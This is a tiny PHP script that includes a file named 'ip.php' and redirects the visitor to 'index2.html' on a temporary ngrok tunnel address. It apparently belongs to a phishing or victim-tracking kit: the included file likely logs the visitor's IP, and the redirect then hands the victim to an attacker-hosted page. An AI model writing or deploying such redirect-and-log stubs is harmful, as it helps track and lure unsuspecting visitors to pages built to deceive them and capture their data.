<?php
include 'ip.php';
header('Location: https://3ec4fbd6841f.ngrok.io/index2.html');
exit
?>
